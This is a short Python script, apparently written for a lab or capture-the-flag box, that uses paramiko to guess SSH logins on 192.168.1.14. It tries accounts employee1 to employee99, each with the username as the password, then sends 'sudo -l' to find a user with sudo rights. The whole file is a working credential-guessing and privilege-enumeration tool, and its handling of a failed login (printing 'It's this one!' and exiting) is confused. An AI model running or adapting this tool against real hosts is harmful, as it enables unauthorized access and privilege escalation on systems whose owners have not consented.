#!/bin/python3

import paramiko
from time import sleep

cli = paramiko.SSHClient()
cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
cli.load_system_host_keys()

def connect(ip):

	for u in range(1, 100):
		user = 'employee'
		user = user + str(u)
		pwd = user

		try:
			cli.connect(ip, username=user, password=pwd)
		
		except paramiko.AuthenticationException:
			print("It's this one!")
			cli.close()
			exit()

		channel = cli.invoke_shell()

		channel_data = str()
		req_str = "Sorry, user {} may not run sudo on localhost.".format(user)


		if channel.recv_ready():
			channel_data += channel.recv(9999).decode('UTF-8')

		channel.send('sudo -l\n')
		sleep(0.5)
		channel.send(pwd + '\n')
		sleep(0.5)
		channel_data += channel.recv(9999).decode('UTF-8')
		sleep(0.5)

		if req_str not in channel_data:
			print("##################################FOUND HIM###########################")
			print(channel_data)
			print("######################################################################")
			exit()
		else:
			print("[*] Tried User {}. Not him".format(u))


		cli.close()


if __name__=="__main__":
	connect('192.168.1.14')